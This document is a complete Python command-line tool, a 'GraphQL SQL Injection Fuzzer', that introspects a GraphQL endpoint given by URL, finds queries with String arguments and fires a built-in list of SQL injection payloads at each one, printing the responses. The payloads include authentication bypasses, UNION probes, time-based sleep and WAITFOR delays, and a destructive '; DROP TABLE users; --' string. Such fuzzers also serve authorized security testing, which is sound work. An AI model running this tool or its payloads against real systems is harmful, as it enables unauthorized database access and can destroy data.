#!/usr/bin/env python3
"""
Usage:
    python sqli.py -u http://localhost:3000/graphql
"""

import argparse
import json
import requests

def get_named_type(type_info):
    if type_info is None:
        return None
    kind = type_info.get("kind")
    if kind in ("NON_NULL", "LIST"):
        return get_named_type(type_info.get("ofType"))
    return type_info.get("name")

def introspect_schema(endpoint, headers):
    introspection_query = """
    query IntrospectionQuery {
      __schema {
        queryType { fields {
          name
          args { name type { kind name ofType { kind name ofType { kind name } } } }
          type { kind name ofType { kind name ofType { kind name } } }
        } }
      }
    }
    """
    try:
        res = requests.post(endpoint, json={"query": introspection_query}, headers=headers, timeout=10)
        data = res.json()
    except Exception as e:
        print(f"[!] Introspection failed: {e}")
        return {}

    if "errors" in data:
        print(f"[!] Schema errors: {data['errors']}")
        return {}

    schema = data["data"]["__schema"]
    return {"query": schema["queryType"]["fields"]}

def get_type_fields(type_name, endpoint, headers):
    # Now fetch each field's name and type for the object
    type_query = f'''
    query TypeFields {{
      __type(name: "{type_name}") {{
        fields {{
          name
          type {{ kind name ofType {{ kind name ofType {{ kind name }} }} }}
        }}
      }}
    }}
    '''
    try:
        res = requests.post(endpoint, json={"query": type_query}, headers=headers, timeout=10)
        data = res.json()
    except Exception as e:
        print(f"[!] Failed to get fields for type {type_name}: {e}")
        return []

    fields = data.get("data", {}).get("__type", {}).get("fields") or []
    # Return list of (fieldName, namedType) tuples
    return [
        (f["name"], get_named_type(f["type"]))
        for f in fields
        if f and f.get("name")
    ]

def generate_sql_payloads():
    return [
        " '",
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 'a'='a",
        "' UNION SELECT NULL--",
        "'; DROP TABLE users; --",
        "' AND 1=0 UNION SELECT NULL,NULL--",
        "\" OR \"\" = \"",
        "') OR ('1'='1",
        "admin' --",
        "' OR sleep(5)--",
        "' AND sleep(5)--",
        "' WAITFOR DELAY '0:0:5'--",
        "' OR 'x'='x' /*",
        "' OR EXISTS(SELECT * FROM users)--",
        "' AND 1=(SELECT COUNT(*) FROM tablename)--",   
    ]

def main():
    parser = argparse.ArgumentParser(description="GraphQL SQL Injection Fuzzer")
    parser.add_argument("-u", "--url", required=True, help="Full GraphQL endpoint URL")
    parser.add_argument("-H", "--headers", help='JSON headers, e.g. \'{"Authorization":"Bearer TOKEN"}\'')
    args = parser.parse_args()

    endpoint = args.url
    headers = {}
    if args.headers:
        try:
            headers = json.loads(args.headers)
        except json.JSONDecodeError:
            import ast
            headers = ast.literal_eval(args.headers)

    payloads = generate_sql_payloads()
    scalar_types = {"String", "Int", "Float", "Boolean", "ID"}

    print(f"[+] Introspecting {endpoint}")
    schema = introspect_schema(endpoint, headers)
    if not schema:
        return

    all_fields = schema["query"]
    # Find all fields with at least one String arg
    targets = []
    for field in all_fields:
        name = field["name"]
        args_list = field.get("args", [])
        string_args = [a["name"] for a in args_list if get_named_type(a["type"]) == "String"]
        if string_args:
            return_type = get_named_type(field["type"])
            targets.append((name, args_list, string_args, return_type))
    
    if not targets:
        print("No queries with String fields.")
        return

    for field_name, args_list, string_args, return_type in targets:
        is_object = return_type not in scalar_types and return_type
        output_fields = []
        if is_object:
            # Get subfields and pick up to two that are scalar
            subfields = get_type_fields(return_type, endpoint, headers)
            output_fields = [n for n,t in subfields if t in scalar_types][:2]
            if not output_fields:
                # If no scalar subfields, skip this field
                continue

        print(f"\n[>] Testing {field_name} (string args: {string_args})")
        for payload in payloads:
            # inject payload into *all* string args
            arg_assignments = [f'{arg}: "{payload}"' for arg in string_args]
            args_str = ", ".join(arg_assignments)

            if is_object:
                sel = " ".join(output_fields)
                query = f'query {{ {field_name}({args_str}) {{ {sel} }} }}'
            else:
                query = f'query {{ {field_name}({args_str}) }}'

            try:
                res = requests.post(endpoint, json={"query": query}, headers=headers, timeout=10)
                if res.status_code == 200:
                    print(f"\n\tPayload: {payload}")
                    print(f"\tQuery: {query}")
                    print(f"\tResponse: {res.text}")
            except Exception as e:
                print(f"[!] Error for {field_name}: {e}")

if __name__ == "__main__":
    main()
